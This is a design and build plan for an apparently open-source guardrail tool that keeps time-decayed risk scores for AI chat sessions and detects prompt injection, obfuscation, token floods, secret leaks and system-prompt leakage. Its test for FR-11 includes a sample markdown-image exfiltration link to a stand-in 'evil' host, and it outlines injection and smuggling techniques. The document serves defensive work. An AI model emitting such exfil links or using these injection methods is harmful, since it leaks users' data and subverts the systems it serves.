# Build Plan — pink-crow

> Spec-driven. Nothing gets built that isn't written here. When reality forces a change, this file is
> edited first, then the code. Derived from `finding.md` (2026-10-04).

## 0. Thesis & principles

**Thesis:** *pink-crow is the open-source, deterministic session-risk layer for AI chat/agents — it keeps a
live, auditable risk score for every chat and session across OWASP LLM/agentic categories (including the
neglected LLM06 Unbounded Consumption) and acts (flag, redact, time-out) via a policy engine, as a
language-agnostic drop-in that can speak Agent Control Standard dispositions.*

**Principles (decide every trade-off):**
1. **Deterministic & auditable first** — every point of a score is explainable and replayable, offline, no
   cloud/ML in the hot path. ML is optional, pluggable enrichment.
2. **Defense-in-depth, never prevention theatre** — assume injection eventually succeeds; *see the campaign
   build* and *limit blast radius*. Ship the honest-limits doc.
3. **Blast-radius thinking** — default **fail-closed**; least privilege in every default; surface
   lethal-trifecta / Rule-of-Two posture as advisory.
4. **Drop-in anywhere, zero required deps in the core** — stdlib-only engine; server/ML/stores are extras.
5. **Standards-anchored** — every rule cites an OWASP/AISVS ID; emit ACS dispositions; determinism is the
   headline strength (reproducible, offline, private, free, auditable).

## 1. Goals & non-goals

**Goals**
- A stdlib-only Python core that scores a single chat event (input or output) into **Findings** mapped to
  OWASP 2026 IDs, and maintains a **cumulative, time-decayed session risk score**.
- Coverage of the runtime-text-detectable OWASP subset (2026 IDs; see the `finding.md §4` crosswalk for 2025
  equivalents): **LLM01:2026** (injection, incl. obfuscation + indirect), **LLM06:2026** (unbounded
  consumption), **LLM02:2026 / DSGAI01** (sensitive-info egress), **LLM08:2026** (hidden-context / system-prompt
  leakage), **LLM10:2026** (improper/exfil-prone output); agentic **ASI01/ASI02/ASI05/ASI06** edges where
  text/tool-call signals exist.
- A **policy engine**: score bands → actions (`allow` / `flag` / `redact` / `block` / `cooldown`), where
  `cooldown` is the user-facing **session time-out**; fail-closed by default, fully config-driven.
- **ACS disposition** emission (`allow`/`deny`/`modify`/`ask`/`defer`) from a scan result.
- A **risk header/block** appended to every input/output (`X-PinkCrow-Risk` + JSON detail).
- Drop-in surfaces: **HTTP gateway** (FastAPI) + **pure-ASGI middleware** + **thin SDK wrappers** (OpenAI,
  framework-agnostic `guard()`) + a **CLI** + a **GitHub Action** (CI red-team/guardrail-regression gate, SARIF).
- Honest docs, a labeled fixtures corpus, and reproducible claims.

**Non-goals** (deliberately excluded)
- **Not** a trained ML classifier or a claim to out-detect one on novel attacks. ML is opt-in enrichment only.
- **Not** a replacement for architectural controls (least privilege, sandboxing, tenant isolation, signing).
- **Not** an LLM proxy/router (we complement LiteLLM/Portkey, not replace them); no model hosting.
- **Not** a content-moderation / toxicity platform (out of scope; pluggable if a user wants it).
- **No** telemetry phone-home, **no** required network calls, **no** bundled model weights in the core.
- Non-English *phrase* rules are best-effort; we do not claim full multilingual injection detection.

## 2. Users & jobs-to-be-done

- **Primary — Platform/AppSec engineer** running a public-facing chatbot/agent. Job: *"Drop a control in
  front of my LLM that keeps a live, explainable risk score per session and automatically flags/times-out
  sessions that look like an attack campaign — without sending my traffic to a cloud vendor."*
- **Secondary — Backend/ML engineer** integrating a bot. Job: *"Add input/output guarding in a few lines
  (SDK or middleware) and get a risk score I can log and act on."*
- **Tertiary — Security lead / compliance.** Job: *"Show me a reproducible, standards-mapped audit trail of
  why a session was blocked (OWASP IDs, the exact signals), and let me gate it in CI."*

Primary user in one line: **the engineer accountable for a live AI chatbot who needs an offline, auditable,
session-aware risk gate.**

## 3. Functional spec (numbered, testable)

**Core scoring**
- **FR-1** `scan_input(text, *, session_id=None, provenance="user", context=None, occurred_at=None) -> ScanResult`
  runs all enabled input detectors and returns findings, an event score (0–100), the updated session score, and
  a disposition. `occurred_at` (epoch seconds) defaults to the Engine clock's now; passing it makes scoring
  **deterministic and replayable** (B2). *Test: known-injection string yields ≥1 finding tagged `LLM01:2026` and
  event score > 0.*
- **FR-2** `scan_output(text, *, session_id=None, context=None, occurred_at=None) -> ScanResult` runs
  output/egress detectors. *Test: a string containing a fake AWS key + a Luhn-valid test card yields findings
  `LLM02:2026`/`DSGAI01`.*
- **FR-3** A `Finding` has: `rule_id`, `owasp_ids: list[str]`, `category`, `severity` (info/low/med/high/crit),
  `score`, `message`, `span` (start,end) or `None`, `evidence` (redacted), `confidence`. **`owasp_ids` dual-emits
  both the 2026 and the 2025 edition IDs where a crosswalk exists** (e.g. `["LLM06:2026","LLM10:2025"]`), per the
  10-row crosswalk in `finding.md §4` / `docs/OWASP-MAPPING.md`, so the audit trail is valid whichever edition a
  reader knows. *Test: schema/fields; a consumption finding lists both `LLM06:2026` and `LLM10:2025`.*
- **FR-4 (session-score combination — the moat's core, defined exactly).** First decay the stored accumulator
  **on read** (decay acts on the **unclamped** `A_last`, not on the 0–100 banded value — so a sustained campaign
  that drove the internal accumulator well above 100 stays in the Critical band longer than a reader expecting
  "score 100" might assume; this is intended, and noted in §8): `A_decayed = A_last · e^(−λ·(now − last_seen))`,
  λ = ln2 / `half_life`. Then:
  - **On a scan** (an event with `event_score`): update `A_new = A_decayed + event_score`, set `A_last ← A_new`
    and `last_seen ← occurred_at`, and the **banded/reported value is the post-update**
    `session_score = clamp(round(A_new), 0, 100)` — the current turn counts toward its own disposition (it must
    not lag by a turn).
  - **On a pure read** (no event, e.g. `GET /v1/session/{id}`): `session_score = clamp(round(A_decayed), 0, 100)`;
    `A_last`/`last_seen` are unchanged.

  `now`/`occurred_at` come from the Engine's **injectable clock** (B2), never a bare `time.time()` call inside
  scoring. Two companion signals:
  (a) **EWMA** `E_t = α·x_t + (1−α)·E_{t−1}` (where `x_t` = the current `event_score`), `α = 1 − e^(−Δt/τ)`, is an **advisory** "recent-severity" value
  reported in `explain()` + the risk header — it is **not** banded on unless a config rule promotes it;
  (b) **sliding-window caps** are a **hard override**: if events-in-window or summed-score-in-window exceed a
  configured cap, the disposition is forced to **at least `block`** regardless of `session_score` (flood/burst
  protection). *Test: a single scan of score `s` at a fresh session reports exactly `s` (the current event is
  included, not lagged by a turn); with no new events the score halves after exactly one `half_life` on read
  (±ε); the accumulator is monotonic within a same-instant burst; exceeding a window cap forces `block` even at
  low score.*
- **FR-5** Scores are **normalized to 0–100** and **clamped**; the session score never latches — it decays on
  read. *Test: a one-off spike decays below the flag threshold after enough idle time.*

**Detectors (each finding carries OWASP IDs)**
- **FR-6 (LLM01)** Detect instruction-override phrases, role/delimiter confusion (fake `system:` turns,
  leaked chat-template tokens), and obfuscation: zero-width/tag-block/bidi chars, homoglyph/mixed-script,
  base64/hex (decode-and-rescan, bounded depth), leetspeak, char-spacing. *Test: a fixtures set of positives
  all flag; a benign set stays under threshold; an invisible-tag-block smuggle flags.*
- **FR-7 (LLM01 indirect)** Provenance-aware: the same checks on `provenance in {"retrieved","tool"}` raise
  severity vs. `"user"`. *Test: identical override text scores higher as `tool` than as `user`.*
- **FR-8 (LLM06)** Detect oversized input, token-estimate floods, low unique-token (repetition) ratio, zlib
  compression-bomb ratio, and "repeat forever/N times" patterns; session-level burst rate + context growth.
  *Test: a 100k-char repeated string flags `LLM06:2026`; a "repeat the word X forever" prompt flags.*
- **FR-9 (LLM02/DSGAI01)** Detect secrets (AWS/OpenAI/GitHub/JWT/PEM) **entropy-gated**, and PII
  (email/SSN/credit-card **Luhn-validated**). *Test: a fake-but-format-valid key flags; a random 16-digit
  number that fails Luhn does NOT flag as a card.*
- **FR-10 (LLM08)** Detect system-prompt / hidden-context leakage via **canary token** (exact match of a
  configured canary in output = definitive) + phrase heuristics + n-gram overlap vs. a known system prompt.
  *Test: output containing the canary flags `LLM08:2026` at critical severity.*
- **FR-11 (LLM10)** Detect dangerous/exfil-prone output: shell/`eval`/SQL/HTML-JS constructs, ANSI/OSC
  terminal control chars, and markdown-image/link exfil. **"External" is defined by a configurable
  `allowed_hosts` allowlist** (default: empty → every outbound link/image host in model output is flagged;
  callers widen it to their own domains). *Test: with default config an `![x](http://evil/?d=)` output flags
  `LLM10:2026`; the same link to an allowlisted host does not.*
- **FR-12 Redaction** `ScanResult.redacted_text` masks matched secrets/PII (e.g. `sk-…` → `‹PINKCROW:SECRET›`),
  and `ScanResult.redactions: list[RedactionSpan]` records each `(start, end, label)` **in the original text**
  (the mask may differ in length, so offsets are reported against the original, not preserved in the masked
  string). *Test: `redacted_text` contains no matched secret substring; each `RedactionSpan` maps back to the
  exact original location/label.*

**Policy & dispositions**
- **FR-13** A `Policy` maps session-score bands to actions and defines `half_life`, `ewma_halflife`, window,
  caps, `cooldown_window`, `cooldown_on` (default `{critical, window_cap}`), per-rule enable/disable, and
  `fail_mode` (default `closed`). Loadable from dict / JSON (YAML optional). Ships three built-in profiles
  (`baseline`/`standard`/`strict`). *Test: round-trip load; invalid config raises a clear error.*
- **FR-14** `PolicyEngine.evaluate(session) -> Disposition` yields one of `allow | flag | redact | block |
  cooldown`. **`cooldown` is pink-crow's "session time-out"** — renamed from `timeout` to avoid colliding with
  ACS's approver-`timeout_disposition` (B4). **Cooldown-entry trigger (explicit):** a session enters cooldown —
  setting `cooldown_until = now + cooldown_window` — when a scan produces a `block` whose cause is in the
  configured `cooldown_on` set. The default `cooldown_on = {critical, window_cap}` arms cooldown on a
  Critical-band (`≥85`) block **or** a window-cap hard-override block, but **not** on a single High-band block
  (one `block` turn ≠ a timed-out session). `cooldown_window` and `cooldown_on` are policy config. While
  `now < cooldown_until`, subsequent scans short-circuit to `cooldown` **without re-scoring**. *Test: a scripted
  escalating 5-turn session reaches a Critical block that arms cooldown (flag→block→cooldown); a 6th turn within
  the window is refused without re-scoring; a lone High-band block with default config does NOT arm cooldown.*
- **FR-15** `ScanResult.to_acs() -> dict` emits an ACS-shaped `response-envelope` with `decision`
  (`allow`/`deny`/`modify`/`ask`/`defer`), `reasoning` (required on non-allow), and `reason_codes` (OWASP IDs),
  per the canonical mapping below. **Inline-gateway semantics (no human approver present):** `ask` and `defer`
  degrade to **fail-closed `block`** by default (config can switch to pass-through-advisory, i.e. `allow` +
  populated `reason_codes`); `modify` is realized by applying the redaction transform when one exists, else it
  degrades to `block`. So every ACS decision has a concrete inline effect. **Pin ACS v0.1.0** as the target
  envelope schema; note that ACS's `ask-details.timeout_disposition` and `defer-details.timeout_decision` are
  two *distinct* fields (ask vs. defer), both defaulting to `deny` — pink-crow sets both to `deny` (fail-closed).
  *Test: critical score → `decision=="deny"` + non-empty `reasoning`; a medium score with no safe transform →
  inline `block`; the emitted envelope validates against a bundled ACS v0.1.0 response-envelope example.*

  **Canonical band → action → ACS mapping (single source of truth; thresholds are policy-config, not hardcoded):**

  | Session-score band | pink-crow action (FR-14) | ACS `decision` (FR-15) | Inline-gateway effect |
  |---|---|---|---|
  | Low `<30` | `allow` (or `flag` if a soft rule fired) | `allow` (+ `reason_codes` when a soft rule fired) | pass through; annotate risk header |
  | Medium `30–59` | `redact` if a safe transform exists, else `flag` | `modify` if transform exists, else `ask` | apply redaction, else fail-closed `block` |
  | High `60–84` | `block` | `ask` | fail-closed `block` (no approver inline); does **not** arm cooldown by default |
  | Critical `≥85` | `block` **+ arm cooldown** (default `cooldown_on`) | `deny` (+ `reasoning`) | block, then sets `cooldown_until = now + cooldown_window` |
  | Window-cap exceeded (FR-4 hard override) | `block` **+ arm cooldown** (default `cooldown_on`) | `deny` | block, then arms cooldown |
  | Within `cooldown_until` (already armed) | `cooldown` | `deny` | refuse without re-scoring until cooldown elapses |
  | Scorer/store error (FR-16) | per `fail_mode` (default `block`) | `defer` → fail-closed `deny` | block |

  The **only** rows that arm `cooldown_until` are the two marked "arm cooldown" (governed by `cooldown_on`); the
  "Within `cooldown_until`" row is a session *already* in cooldown. This is the single referent for FR-14's trigger.

- **FR-16 Fail-closed** If a detector or store errors, the engine returns a safe disposition per `fail_mode`
  (default: `block` / ACS `deny`), never silently `allow`. *Test: a detector raising still yields a non-allow result.*

**Surfaces**
- **FR-17 CLI** `pink-crow scan [FILE|-] [--output|--input] [--format text|json|sarif] [--fail-on SCORE]`
  exits non-zero when the score ≥ `--fail-on`; `pink-crow rules` lists rules+OWASP IDs; `pink-crow serve`
  starts the gateway; `pink-crow redteam DIR` scores a corpus; `pink-crow version`. *Test: CLI invocations,
  exit codes, SARIF validates.*
- **FR-18 Gateway** FastAPI app: `POST /v1/scan/input`, `POST /v1/scan/output`, `GET /v1/session/{id}`,
  `GET /healthz`, `GET /metrics` (plain text). Responses carry `X-PinkCrow-Risk`. **Session-store consistency
  (B3):** the default `InMemorySessionStore` is **single-process only** — under multiple uvicorn/gunicorn
  workers or replicas one logical session fragments across processes and the cumulative score is computed on
  partial data (a correctness failure for a security control). Because a worker generally cannot observe that it
  is 1-of-N from inside its own process, the gateway gates on **explicit config** rather than an unobservable
  worker count: `PINKCROW_STORE=memory|shared` (and/or `expected_workers`). It (a) **emits a loud startup
  warning** whenever the in-memory store is selected without an explicit single-process acknowledgement, and
  (b) **requires a shared store** (the `[redis]` extra) for any multi-worker/replica deployment; this constraint
  is stated in `docs/LIMITS.md` and the gateway docs. **Auth/exposure (N6):** `/v1/scan/*` and especially
  `/v1/session/{id}` (which returns session risk + redacted evidence) and `/metrics` assume a **trusted network /
  optional bearer token** — documented as deploy requirements; session IDs must be **non-guessable**
  (caller-supplied opaque or server-generated UUID). *Test: httpx/TestClient hits each route; header present; a
  flagged session returns the right disposition; selecting the in-memory store without the single-process ack
  emits the warning.*
- **FR-19 ASGI middleware** `PinkCrowMiddleware` (pure ASGI, not `BaseHTTPMiddleware`) scans configured
  request/response JSON fields and appends the risk header without breaking streaming. *Test: mounted on a toy
  app, header appears; a streaming route still streams.*
- **FR-20 SDK** `guard(session_id)` context manager + `GuardedOpenAI`-style wrapper that scans messages
  pre-call and completion post-call and raises `PinkCrowTripwire` on a blocking disposition. *Test: wrapper
  over a mock client trips on an injection message; passes a benign one.*
- **FR-21 GitHub Action** root `action.yml` (composite) runs `pink-crow scan`/`redteam` over an input path,
  emits SARIF, and fails per `fail-on`. `branding` icon+color from the pink-crow palette. *Test: `action.yml`
  parses and required keys present; the wrapped command runs locally.*

**Cross-cutting**
- **FR-22 Explainability** every `ScanResult` exposes `explain()` → a human-readable breakdown (each
  contributing finding, its score, OWASP ID, and the decay state). *Test: explain lists all findings.*
- **FR-23 Self-scan** `pink-crow scan --output` over the repo's own prose docs (`README.md`, `docs/*.md`;
  **excluding** `rules_data.py` and the `fixtures/` corpus, which deliberately contain attack strings) using the
  default `standard` profile returns no *critical* findings — guarding against the tool tripping on itself /
  embarrassing false positives. The excluded paths are listed explicitly so the guarantee is reproducible, not
  incidental. *Test: CI self-scan step over the pinned doc set is green.*
- **FR-24 ReDoS safety** Worst case is bounded by **caps, not by interrupting a match** — stdlib `re` cannot
  be aborted mid-match. The guarantees are: a **pre-match length cap** on inputs/variants (`length_cap`) and
  on scanned output (`max_output_chars`); **every bundled regex uses bounded quantifiers** incl. all URL/label
  character classes (`{0,N}`), so no class can backtrack over the whole input; and a per-detector
  `scan_time_budget_ms` that stops running *further* detectors once spent (it does **not** abort the current
  regex). *Test: pathological inputs (long repeats, bracket/URL bombs, NFKC expansion) each scan well under a
  fixed wall-clock bound; benign inputs unaffected.*
- **FR-25 Replayable audit (the auditability moat).** Two distinct artifacts, named so readers don't expect raw
  text where there is none:
  - **Audit log** (what the Engine persists in production): per scanned event, an append-only entry
    `(session_id, occurred_at, provenance, event_score, finding rule_ids+owasp_ids, resulting session_score,
    disposition, engine_version, unicode_version)`. **It stores no raw prompt text** (no secrets persisted), yet
    is sufficient to **reproduce the session-score trajectory and dispositions** — this backs "why was this
    session *blocked*?" reproducibly.
  - **Replay log** (a test/forensics artifact the operator opts into): additionally stores `text`, so a replay
    also re-derives each `event_score` from input and proves **detector determinism** end-to-end.

  *Test: record a multi-turn `(text, occurred_at, provenance)` replay log, replay it through a fresh Engine with
  a `FixedClock`, and assert an identical per-turn `session_score` + disposition sequence; separately, replay the
  text-free audit log and assert the same trajectory.*

## 4. Architecture

```
                   ┌──────────────────────── pink-crow ────────────────────────┐
  chat input  ───▶ │  Engine.scan_input ─┐                                      │
 (user / RAG /     │                     ├─▶ Detectors ─▶ Findings (OWASP IDs)  │
  tool content)    │  Engine.scan_output─┘        │                             │
                   │                               ▼        ▲ injectable Clock  │
  model output ──▶ │                      Scoring (decayed accumulator +EWMA)   │
                   │                               │  SessionStore (TTL)        │
                   │                               ▼        ├─▶ Audit log       │
                   │                      PolicyEngine ─▶ Disposition  (replay) │
                   │                               │   (allow/flag/redact/      │
                   │                               ▼    block/cooldown)         │
                   │   risk header  ◀───  ScanResult ──▶ .to_acs()  ──▶ ACS env │
                   └────────────────────────────────────────────────────────────┘
      surfaces:  CLI · FastAPI gateway · ASGI middleware · OpenAI/guard() SDK · GitHub Action (SARIF)
```

**Trust boundaries.** Untrusted input enters at `scan_input` (user text; retrieved/tool content is *more*
untrusted → higher weight via provenance). Model output is untrusted for egress at `scan_output`. The
detectors must be ReDoS-safe and never `eval` input. Secrets are redacted before they can reach logs. The
gateway terminates no TLS itself (deploy behind the user's ingress).

**File layout**
```
pink_crow/
  __init__.py          # public API: scan_input, scan_output, Engine, Policy, __version__
  models.py            # Finding, ScanResult, Disposition, Severity (dataclasses)
  signals/             # stdlib primitives
    normalize.py       #   NFKC, strip/flag invisible+bidi+tag-block, homoglyph skeleton
    entropy.py         #   Shannon entropy
    luhn.py            #   Luhn mod-10
    tokens.py          #   cheap token/char estimate, repetition ratio, zlib ratio
    codecs.py          #   bounded base64/hex decode-and-rescan
  detectors/
    base.py            # Detector protocol (pluggable; ML detectors implement this)
    injection.py       # LLM01 (+ ASI01/06 edges)
    consumption.py     # LLM06
    egress.py          # LLM02 / DSGAI01 / LLM08 / LLM10
    rules_data.py      # pattern tables (override phrases, secret regexes, ...), each w/ OWASP IDs
  scoring.py           # decay-on-read accumulator + EWMA + window caps; SessionState
  session.py           # SessionStore protocol + InMemorySessionStore (TTL, single-process); redis adapter = extra
  clock.py             # Clock protocol + SystemClock + FixedClock (injectable; enables replay)
  audit.py             # append-only audit entries + replay helper (FR-25)
  policy.py            # Policy, PolicyEngine, built-in profiles (baseline/standard/strict)
  acs.py               # ScanResult -> ACS response-envelope dict (band→decision mapping)
  engine.py            # Engine façade wiring detectors+scoring+policy+store+clock+audit
  riskheader.py        # X-PinkCrow-Risk builder + parser
  cli.py               # argparse CLI; sarif.py emitter
  sarif.py             # SARIF 2.1.0 emitter (partialFingerprints)
  gateway/             # extra [gateway]
    app.py             # FastAPI app + routes
    middleware.py      # pure-ASGI PinkCrowMiddleware
  integrations/
    openai.py          # GuardedOpenAI-style wrapper (duck-typed; openai not required)
    guard.py           # guard() context manager, PinkCrowTripwire
action.yml             # root composite GitHub Action (Marketplace)
tests/ … fixtures/ … docs/ … examples/
```

**Key data models** (dataclasses; `to_dict()`/`from_dict()` for JSON):
`Severity(Enum)`; `Finding(...)` per FR-3; `ScanResult(event_score, session_score, findings, disposition,
redacted_text, risk_header, session_id, explain())`; `Disposition(action, acs_decision, reason_codes,
reasoning)`; `SessionState(session_id, accumulator, ewma, window_events, created, last_seen, flagged,
cooldown_until)` (score is derived on read from `accumulator` + `last_seen` via the clock);
`Policy(bands, half_life, ewma_halflife, window_seconds, caps, cooldown_window, cooldown_on, rule_overrides,
fail_mode, allowed_hosts, scan_length_cap, scan_time_budget_ms)` (FR-13 is authoritative); `Clock` (protocol:
`now() -> float`); audit entry per FR-25.

**Tech choices + rationale**
- **Language: Python 3.9+** (floor for reach; LLM ecosystem is Python; dev/test on 3.12). *Rejected: Go/Rust
  — would fragment from the ecosystem the users live in and slow contribution.*
- **Core deps: none (stdlib only)** — `re`, `unicodedata`, `zlib`, `math`, `json`, `time`, `hashlib`,
  `dataclasses`, `argparse`. *This is the whole point: embeddable, fast, auditable, offline.*
- **Optional extras (each justified):** `[gateway]` → `fastapi`,`uvicorn` (server only); `[yaml]` → `pyyaml`
  (config sugar; JSON works without it); `[redis]` → `redis` (distributed session store); `[ml]` →
  `transformers`,`torch` (opt-in enrichment detector — **never** a core/default dep). `[openai]` is *not*
  needed — the wrapper duck-types the client.
- **Build: `pyproject.toml`** (hatchling), console entry point `pink-crow`. **Dev:** `pytest`, `ruff`,
  `mypy`, `build`; `hypothesis` optional for fuzz/ReDoS. **CI:** GitHub Actions matrix (3.9–3.12).
- *Rejected:* bundling any ML model by default (license/size/offline/determinism); a DB in the core
  (in-memory store is the default; redis is an extra); `BaseHTTPMiddleware` (breaks streaming — use pure ASGI).

## 5. Milestones (build order — each independently verifiable)

| M | Ships | FRs | Acceptance check (empirical) |
|---|-------|-----|------------------------------|
| **M1** | Models + signal primitives + scoring/session | FR-3,4,5,22,24 | Unit tests: half-life decay (±ε), accumulator monotonic, Luhn, entropy, zlib ratio; a `python -c` demo prints a session score. |
| **M2** | Injection detectors + normalization (LLM01) | FR-1,6,7,24 | Fixtures: all positives flag, benign stay under threshold, tag-block smuggle flags, provenance raises score; ReDoS timing test passes. |
| **M3** | Consumption (LLM06) + Egress (LLM02/08/10/DSGAI01) + redaction | FR-2,8,9,10,11,12 | Fixtures: flood/repeat flag; fake key flags, non-Luhn 16-digit doesn't; canary exact-match critical; markdown-exfil flags; redaction removes secret substrings. |
| **M4** | Policy engine + ACS + risk header + fail-closed + audit/replay | FR-13,14,15,16,23,25 | Scripted escalating session crosses flag→block→cooldown, 6th turn refused; critical→ACS `deny`+reasoning; raising detector → non-allow; recorded event log replays to a byte-identical score trajectory. |
| **M5** | CLI + SARIF | FR-17 | `pink-crow scan/rules/redteam/version` run; SARIF validates vs 2.1.0 schema; `--fail-on` exit codes correct. |
| **M6** | Gateway + ASGI middleware + SDK wrappers | FR-18,19,20 | TestClient hits all routes, header present; middleware preserves a streaming route; OpenAI wrapper trips on injection (mock), passes benign. |
| **M7** | `action.yml` + packaging + CI + docs scaffold | FR-21 | `action.yml` parses w/ required keys+branding; `pip install -e .` works; CI matrix config lints; self-scan (FR-23) green. |

Sequenced so something runnable exists at **M1** and every milestone adds a verifiable capability. Note that
`ScanResult.disposition` exists from FR-1 (M2) while the full `PolicyEngine` lands in M4 — so **M2 ships a
trivial default policy** (score-band → action with built-in thresholds, no cooldown/ACS) so `disposition` is
always well-defined; M4 replaces it with the configurable engine.
**Build CAP = 7 milestones + 3 = 10 iterations (hard ceiling 12).**

## 6. Test strategy

- **Unit** (pytest): scoring math (decay-on-read half-life property, accumulator, EWMA α conversion, window-cap
  override), Luhn, entropy, normalization (invisible/bidi/tag-block/homoglyph), each detector on crafted
  strings, redaction spans map back to original offsets.
- **Fixtures corpus** (`fixtures/attacks/*.jsonl`, `fixtures/benign/*.jsonl`): labeled positives/negatives per
  category. The **benign corpus is sized and sourced for a meaningful FP number** (≥500 benign samples drawn
  from ordinary chat, pasted code/logs, and security-topic text that *looks* adversarial but isn't), and a test
  asserts a **sane precision/recall floor** (≥X% positive recall, ≤Y% benign FP). The DoD requires the real
  X/Y be measured and published — not left as placeholders (see §9). Numbers always reported, never inflated.
- **Integration**: a **multi-turn session scenario** test reproducing the headline claim (escalating attack →
  flag → block → cooldown, then decay below threshold after idle). Gateway via `TestClient`. Middleware
  streaming-preservation test. OpenAI wrapper over a mock.
- **Replay/determinism (the moat)**: record a `(text, occurred_at, provenance)` event log, replay it through a
  fresh Engine with a `FixedClock`, and assert a **byte-identical** per-turn `session_score` + disposition
  sequence (FR-25). Also assert the stateless *event* score is byte-identical across runs. **Unicode caveat is
  tested-and-documented, not assumed:** NFKC/homoglyph tables vary by the interpreter's Unicode version, so
  determinism is asserted *within one interpreter* and the Unicode/Python version is recorded in the audit
  metadata (see §8).
- **Adversarial / safety**: **ReDoS** tests — a pathological input scans under the FR-24 length cap + time
  budget; evasion tests (base64/leet/zero-width must still flag); fail-closed test (detector raises →
  non-allow); a CI **regex-complexity lint** over the rule tables.
- **Format**: SARIF output validated against the 2.1.0 schema; `action.yml` parsed/validated.
- **Self-check**: `pink-crow scan` on `README.md`/docs → no critical findings (FR-23), wired into CI.
- **"Self-checks clean"** = `pytest` green, `ruff` clean, `mypy` clean, self-scan green, SARIF valid, every
  README/site claim reproducible by a documented command.

**Every claim → its proof:** "cumulative session scoring" → FR-4 decay-on-read/accumulator tests; "session
time-out" → FR-14 scenario test; "resource-exhaustion scoring" → FR-8 tests; "auditable / replayable" → FR-25
replay test; "**fast** — core scan adds a few ms" → a micro-benchmark asserting the core scan of a few KB stays
**under a 10 ms budget**, always reported **with the machine + input size** (finding.md and this plan use the
same wording; decode-and-rescan / zlib / normalization costs scale with input length and are included);
"deterministic" → the replay + byte-identical-event-score tests above.

## 7. Docs, site & deck plan (executed Phase 4)

- **README**: rendered artistic header, badges (Apache-2.0, python, zero-core-deps, OWASP-2026-anchored,
  ACS-aligned, PRs-welcome), one-line value prop, a rendered **deck** (problem → idea → what's inside → how
  it works → proof → get started), quick start in the first screen, an **"honest about limits"** section
  linking `docs/LIMITS.md`, and an "integrate in your stack" section.
- **Repo docs**: `ARCHITECTURE.md` (mirrors §4 with SVG), `docs/LIMITS.md` (what it can & cannot do),
  `SECURITY.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `docs/OWASP-MAPPING.md` (rule → ID table).
- **Site** (`docs/` GitHub Pages, motion-designed): `index.html` (animated hero, why/how/proof),
  `eli5.html` (leaders/non-technical), `docs.html` (quick start + API/CLI surface), `architecture.html`
  (SVG component + data-flow diagrams), `contact.html` (issues/PR/security/discussions + responsible-use).
- **Assets**: logo/mark (pink signal on corvid ink), 1280×640 social card, a terminal/demo GIF.

## 8. Honest limits (written before building)

- Deterministic detectors catch **known shapes**; novel or ML-crafted attacks **will** bypass them. pink-crow
  is **defense-in-depth, not prevention**. A clean result means *"no violation detected"*, **not** *"secure"*.
- A purely deterministic core **under-detects** sophisticated injection vs. a trained classifier — the
  **pluggable ML detector** (opt-in `[ml]`) is the answer, and we say so plainly rather than overclaiming.
- **False positives** happen on legitimate security content (red-teamers, pasted logs/keys-in-docs). Mitigated
  by entropy/Luhn gating, provenance, tunable thresholds, per-rule toggles, and a decaying (non-latching) score.
- Phrase-based rules are **English-centric**; structural/obfuscation rules are language-agnostic. We do not
  claim full multilingual injection coverage.
- Consumption/rate accuracy depends on the host feeding **real** timing/token truth; our estimates are
  heuristic without it.
- Architectural risks (ASI03/04/07/08/10, supply-chain, poisoning) are **largely out of a text gateway's
  reach** — pink-crow scores only their thin text/tool-call edges and defers the rest to proper controls.
- **Fail-closed is per-scan-error, not absolute.** Inline, a pink-crow fault or ReDoS-abort converts into the
  chatbot refusing that turn (availability cost — a deliberate trade). And if the **gateway process itself
  dies**, traffic that bypasses it is *not* protected — ingress must be configured so pink-crow can't be
  silently skipped. We do not claim pink-crow cannot be bypassed if it isn't in the path.
- **`cooldown` is a decaying time-out, not a permanent ban.** Because the session score decays during the
  cooldown window, a patient attacker can pace requests under the threshold to avoid tripping it. Cooldown
  raises cost and catches bursts; it is not an absolute lockout (configure longer windows / external bans for that).
- **Determinism holds within one interpreter version.** `unicodedata` normalization and homoglyph tables depend
  on the Python/Unicode version; the audit record stores that version so a replay is reproducible on a matching
  interpreter. Cross-version byte-identical output is not guaranteed.
- **Multi-worker/replica needs a shared store** (`[redis]`); the default in-memory store is single-process only
  (B3) — running it under multiple workers silently computes the session score on partial data.
- Not a toxicity/moderation engine; not a model router; no guarantees, no SLA.

## 9. Definition of Done (Phase 3 exit)

- [ ] All FR-1…FR-25 implemented and covered by tests.
- [ ] `pytest` green; `ruff` clean; `mypy` clean; **self-scan** (FR-23) green; SARIF validates.
- [ ] Each surface **run and verified empirically**: CLI commands; gateway routes via TestClient; middleware
      streaming preserved; OpenAI/`guard()` wrapper trips/passes; `action.yml` parses and its command runs.
- [ ] The headline claim reproduced end-to-end by the multi-turn scenario test (flag → block → cooldown → decay),
      and the recorded-log **replay** test (FR-25) passes.
- [ ] The **real** precision/recall numbers (§6) are measured on the fixtures corpus and **published in
      `docs/LIMITS.md` + README — no placeholder X/Y left before launch.**
- [ ] `README.md` claims each map to a runnable command; `docs/LIMITS.md` present and matches reality.
- [ ] `pip install -e .` works on 3.9–3.12; `BUILD_LOG.md` current; committed (pushed when auth available).
